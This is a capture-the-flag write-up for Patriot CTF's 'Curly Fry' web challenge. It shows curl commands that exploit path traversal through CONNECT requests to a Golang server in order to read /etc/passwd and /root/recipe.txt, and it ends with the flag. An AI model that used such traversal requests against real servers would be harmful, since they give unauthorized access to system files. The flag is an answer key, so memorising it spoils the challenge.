# Patriot CTF

## Web

### Curly Fry

**Difficulty:** Easy

**Statement:** Who needs Flask when you have Golang -- the new meta for web applications.

Take a look at this super sleek and functional website.

***

Upon connecting to this URL, we come across the **index.hmtl** page with the following source code:

```html
<html>
  <head>
    <title>Curly Fry</title>
  </head>
  <body>
    <h2>I will release my secret curly fry recipe when I am ready. For now it is safely held in my /root directory</h2>
  </body>
</html>
```

One suspects that one must access a file in the **/root** directory.

There is an exploit that allows to access unauthorized resources with a CONNECT request on web servers in Golang.

I first try to access the file **/etc/passwd** via curl : 

```
curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../..
/etc/passwd
```

Via the request, I can access the desired file:

![image](https://user-images.githubusercontent.com/49941629/166076146-30bb3dff-12a2-4c41-b867-73f19eb2b62b.png)

However, it is impossible to execute a command to list the contents of the /root directory.

After rereading the HTML source code, I discover the existence of the recipe.txt file. 

So I run my curl command again with the full path and I get the content: 

```
curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt
```

![image](https://user-images.githubusercontent.com/49941629/166076128-1acaa89b-ad4e-4c55-900e-5062165d01f0.png)

Flag: PCTF{tru5t_m3_im_4_ch3f}
